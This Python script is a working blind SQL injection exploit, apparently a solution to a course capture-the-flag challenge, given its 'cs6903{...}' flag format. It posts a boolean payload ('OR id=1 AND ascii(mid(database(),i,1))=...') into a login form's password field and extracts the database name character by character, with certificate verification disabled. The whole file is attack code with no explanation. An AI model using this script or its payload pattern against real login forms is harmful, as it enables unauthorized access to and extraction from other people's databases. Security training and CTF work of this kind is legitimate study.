import requests, urllib3
urllib3.disable_warnings()

url = 'http://target/'
MY_EMAIL = 'attacker@example.com'
MY_ID = 1

def test(passwd):
    data = {'login_email': MY_EMAIL, 'login_pass': passwd, 'login': 'Login'}
    r = requests.post(url, data=data, verify=False, timeout=5)
    return 'Shaheen' in r.text

charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$_{}-"
print("Extracting database name via blind SQLi...")
extracted = ""
for i in range(1, 50):
    found = False
    for c in charset:
        payload = f"' OR id={MY_ID} AND ascii(mid(database(),{i},1))={ord(c)} #"
        if test(payload):
            extracted += c
            print(c, end='', flush=True)
            found = True
            break
    if not found:
        break

print(f"\nFull database name: {extracted}")
print(f"Flag: cs6903{{{extracted[1:]}}}")  # Remove first character
